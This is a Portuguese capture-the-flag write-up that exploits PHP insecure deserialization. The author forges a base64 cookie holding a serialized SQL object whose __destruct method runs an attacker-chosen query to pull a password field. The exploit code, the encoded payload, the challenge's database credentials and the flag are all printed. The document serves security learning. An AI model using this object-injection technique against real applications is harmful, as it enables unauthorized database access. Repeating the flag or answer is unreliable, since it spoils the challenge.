# Objetos mágicos

## Alex:

**Flag:** `Ganesh{pHp_!s_Fkn_bR@k3n}`

Ao enviar ids para o site e realizar a busca percebi que o id _2_ possuía o username de _flag_, o que chamou a atenção.

Então fui olhar os source codes do site, fornecidos.

Inicialmente olhei na seguinte parte do código \(`source1.txt`\), pensando que poderia quebrar alguma coisa:

```php
if (isset($_REQUEST['id']) && is_numeric($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } 
    catch (Exception $e) {
        echo 'Invalid query';
    }
}
```

Mas após muitas tentativas \(inclusive de tentar converter uma string para URL encode, tentando burlar a função `ìs_numeric`\), percebi que provavelmente esse não fosse o caminho.

Então passei a olhar para a outra parte do mesmo código \(`source1.txt`\):

```php
if (isset ($_COOKIE['h4ck_m3'])) {
    $sess_data = unserialize(base64_decode($_COOKIE['h4ck_m3']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die("We are secure, you can't hack us!!");
        }
    } 
    catch (Exception $e) {
        echo $e;
    }
} 
else {
    $cookie = base64_encode(serialize(array( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('h4ck_m3', $cookie, time () + (86400 * 30));
}
```

Entendi que isso era uma verificação por meio de cookies para evitar \(ou tentar\) que fosse possível uma SQLInj.  
Então, comecei a olhar para as funções utilizadas nessa verificação e percebi que ela era feita por meio da serialização de um objeto \(array\) que possuia o ip do servidor.  
Me lembrando do top 10 da OWASP, em especial o oitavo item \(Insecure Deserialization\), pensei poder ser esse o caminho para quebrar o código.

Então fiz algumas pesquisas sobre como funciona a serialização/desserialização de objetos no PHP além de falhas relacionadas a isso. Foi quando vi que em um objeto que possui os "_magic methods_" no php \(**wakeup,** destruct, etc\), esses metodos são executados normalmente após o objeto ser desserializado. [\[Link de Base\]](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)

E pra minha sorte \(ou não\) a classe SQL executava o código da busca no método `__destruct`. Então bastava achar uma forma de colocar um objeto do tipo SQL\(\) no cookie de verificação, com a query que eu quiser, para fazer a busca pela flag.

Para isso abri um terminal do php \(`$> php - a`\) e comecei por recriar a classe para conseguir serializá-la.

```php
class SQL {
    public $query = '';
    public $conn;

    public function __construct() {}

    public function connect() {
        $servername = "localhost";
        $username = "db_user";
        $password = "w3b_4_Th3_W!n";
        $database = "cereal";

        $this->conn = new mysqli($servername, $username, $password, $database);

        if (!$this->conn)
            die("Debugging error[" . mysqli_connect_errno() . "]: " . mysqli_connect_error() . PHP_EOL);
    }

    public function SQL_query($query) {
        $this->query = $query;
        echo "QUERY:" . $this->query;
    }

    public function execute() {
        return $this->conn->query($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn))
            $this->connect();

        $ret = $this->execute();

        if ($ret !== false) {   
            echo "<h2> Resposta: </h2>";
            while ($row = $ret->fetch_assoc()) {
                echo '<p class="user"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
```

Então criei uma instancia dessa classe e coloquei nela a query que buscava a flag \(note que a flag provavelmente estava no campo password, o que me fez usar o alias do SQL\).

```php
$sql = new SQL();
$sql->query = "SELECT password as username FROM users WHERE id=2";
```

Então fui olhar nos cookies do navegador, para obter o objeto guardado no cookie "h4ck\_m3". Vendo que estava em _base64_, converti para string e depois para objeto:

```php
$data = unserialize(base64_decode("YToxOntzOjI6ImlwIjtzOjk6IjEyNy4wLjAuMSI7fQ=="));
```

Então eu obtive o objeto que é utilizado para a verificação. Bastava agora inserir o objeto SQL\(\) criado e serializar o array novamente.

```php
$data[0] = $sql;
$str = base64_encode(serialize($data));

echo $str;
```

E isso me imprimiu o resultado: `YToyOntzOjI6ImlwIjtzOjk6IjEyNy4wLjAuMSI7aTowO086MzoiU1FMIjoyOntzOjU6InF1ZXJ5IjtzOjQ5OiJTRUxFQ1QgcGFzc3dvcmQgYXMgdXNlcm5hbWUgRlJPTSB1c2VycyBXSEVSRSBpZD0yIjtzOjQ6ImNvbm4iO047fX0=`.

Agora basta editar o cookie e reenviar a request para o servidor. Ao fazer isso \(pelo próprio dev-tools do firefox\), a página retornada é a seguinte: 

![](https://i.imgur.com/1g7PyYj.png)

